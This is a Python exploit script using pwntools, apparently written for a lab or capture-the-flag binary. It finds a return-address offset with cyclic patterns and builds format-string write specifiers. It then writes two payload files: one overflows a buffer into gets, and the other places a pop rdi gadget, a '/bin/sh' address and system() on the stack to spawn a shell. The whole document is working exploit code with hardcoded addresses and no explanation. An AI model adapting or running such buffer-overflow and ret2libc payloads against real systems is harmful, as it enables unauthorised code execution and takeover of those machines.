from pwn import *

# Fill content with non-zero values
payload = cyclic(300, n=8)
pattern=b'aaaaeaaa' #from gdb
ra_offset = cyclic_find(pattern, n=8)
#foo = p64(0x7ffff7ff1538)
foo = p64(0x5555555552be)
zeros = p64(0x0)
system=p64(0x7ffff7dfe2c0)
ra_addr=p64(0x7fffffffe848)
ra_addr_p_8=p64(0x7fffffffe850)
ra_addr_p_16=p64(0x7fffffffe858)
bin_sh_addr=p64(0x7ffff7f605bd)
pop_rdi_ret_gadget=p64(0x555555555363)
#pop_rdi_ret_gadget=p64(0x03)

ra_addr=0x7fffffffe848
writes = {
        p64(ra_addr): 0x55555363,
        p64(ra_addr+8): 0xf7f6b5bd,
        p64(ra_addr+16): 0xf7e09290,
        }
    
#p64(ra_addr+20):0x7fff
pos=13
payload=b''
addr_str=b''
last_val=0
sorted_writes = {k: v for k, v in sorted(writes.items(), key=lambda item: item[1])}
for addr, val in sorted_writes.items():
    if val != last_val:
        payload += b'%'+bytes(str(val-last_val),'latin-1') + b'c'
        last_val = val
    payload += b'%'+bytes(str(pos),'latin-1')
    pos+=1
    addr_str+=addr
print(payload)
print(len(payload))
print(addr_str)


# call gets
payload=b''
gets= p64(0x7ffff7e3a970)
#payload=b'%p'*13
#pwn_payload = fmtstr_payload(34, {addr: 256}, write_size='int')
print("ra_offset:", ra_offset)
if(len(payload) < ra_offset):
    payload +=b'|'*(ra_offset-len(payload))
payload+=gets
with open("badfile", "wb") as f:
    f.write(payload)
print(payload)
print("len payload: %d" % len(payload))

payload=b''
gets_offset=4 #from gets payload overflow
if(len(payload) < gets_offset):
    payload +=b'|'*(gets_offset-len(payload))
payload+=pop_rdi_ret_gadget
payload+=bin_sh_addr
payload+=system
#payload+=b'\n'

with open("gets_payload", "wb") as f:
    f.write(payload)
print(payload)
print("len gets payload: %d" % len(payload))
